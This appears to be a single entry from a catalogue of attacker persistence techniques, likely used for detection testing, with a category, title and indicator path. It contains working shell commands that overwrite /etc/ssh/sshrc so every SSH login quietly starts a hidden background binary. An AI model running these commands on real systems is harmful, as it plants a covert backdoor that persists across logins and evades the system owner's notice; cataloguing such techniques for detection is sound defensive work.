# category: persistence
# title: Command planted in the SSH login script sshrc
# indicator: /etc/ssh/sshrc
printf '#!/bin/sh\nnohup /usr/local/sbin/.sshd-helper >/dev/null 2>&1 &\n' >/etc/ssh/sshrc
chmod 755 /etc/ssh/sshrc
